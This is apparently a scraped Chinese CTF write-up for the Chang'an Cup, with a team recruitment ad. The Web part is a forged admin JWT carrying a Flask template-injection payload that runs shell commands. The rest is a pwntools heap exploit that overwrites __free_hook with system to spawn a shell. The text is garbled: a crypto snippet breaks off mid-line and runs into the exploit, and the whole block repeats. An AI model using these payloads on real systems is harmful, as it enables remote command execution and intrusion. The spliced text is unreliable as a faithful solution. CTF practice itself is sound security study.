# 长安杯-WriteUp

> 原文: https://www.ctfiot.com/1069.html
> ID: 1069

Web

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0

Crypto

from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()

Reverse

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoie3t1cmxfZm9yLl9fZ2xvYmFsc19fLm9zLnBvcGVuKHJlcXVlc3QuYXJncy5jbWQpLnJlYWQoKX19IiwicGFzc3dkIjoiMTIzIiwicm9sZSI6ImFkbWluIiwidWlkIjoiIn0.KWHbwpGOiRZvRZxbdibiqK5C636QHuVnhUHVz_CDYD0
from Crypto.Util.number import *
# from secret import flag

def add(a,b):
    if(a>')
    sh.sendline('1')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def delete(idx):
    sh.recvuntil('>>')
    sh.sendline('2')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
def edit(idx,size,con):
    sh.recvuntil('>>')
    sh.sendline('3')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
    sh.recvuntil('size?')
    sh.sendline(str(size))
    sh.recvuntil('content?')
    sh.send(con)
def show(idx):
    sh.recvuntil('>>')
    sh.sendline('4')
    sh.recvuntil('idx?')
    sh.sendline(str(idx))
add(0,0x28,'a')
add(1,0x400,'a')
add(2,0x68,'a')
add(3,0x68,'a')
add(4,0x50,'/bin/shx00')
sh.recvuntil('>>')
sh.sendline('1')
sh.recvuntil('idx?')
sh.sendline('0')
sh.recvuntil('size?')
sh.sendline('-1')

edit(0,0x10000,p64(0)*5+p64(0x411+0x70*2))
delete(1)
add(1,0x400,'a')
show(2)
libc.address=u64(sh.recvuntil('x7f')[-6:].ljust(8,'x00'))-96-libc.sym['__malloc_hook']-0x10
print hex(libc.address)
delete(3)
add(1,0x90,0x68*'x00'+p64(0x71)+p64(libc.sym['__free_hook']))
add(2,0x60,'a')
add(2,0x60,p64(libc.sym['system']))
delete(4)
sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/0-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/8-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634875230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/7-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/1-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/5-1634875231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/3-1634875232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/10-1634875232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/10/6-1634875233.png)